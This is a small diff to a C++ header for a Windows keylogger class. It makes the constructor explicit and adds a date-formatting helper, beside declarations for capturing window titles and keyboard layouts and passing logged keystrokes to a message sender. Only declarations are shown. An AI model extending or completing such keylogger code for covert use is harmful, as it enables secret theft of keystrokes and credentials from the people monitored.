@@ -11,7 +11,7 @@
 class KeyLogger
 {
 public:
-	KeyLogger(IMessageSender* sender);
+	explicit KeyLogger(IMessageSender* sender);
 	~KeyLogger();
 
 private:
@@ -21,6 +21,7 @@ private:
 	static std::string GetWindowTitle(HWND windowHandle);
 	static HKL GetKeyboardLayout(HWND windowHandle);
 	static std::string GetWindowPrefix(HWND windowHandle);
+	static std::string FormatDate(std::chrono::system_clock::time_point time);
 
 	void LogKeyboardEvent(const std::string& log) const;
 
